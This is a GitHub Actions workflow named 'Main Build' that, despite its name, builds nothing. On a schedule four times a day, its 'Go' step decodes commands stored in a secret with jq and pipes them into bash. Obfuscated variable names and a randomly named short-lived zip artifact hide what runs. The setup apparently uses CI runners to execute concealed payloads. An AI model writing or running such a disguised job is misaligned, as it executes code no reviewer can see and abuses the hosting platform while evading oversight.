name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '14 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          uaf395: ${{ secrets.uaf395 }}
        run: |
          printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
          printf '%s' "$azb90" | jq -r .yj898 | /bin/bash
          echo $ppz8551 | jq -r .z123 | /bin/bash
          echo $vwh15859 | jq -r .ggnz10618 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: LK9PKSbP
          path: "*.zip"
          retention-days: 1
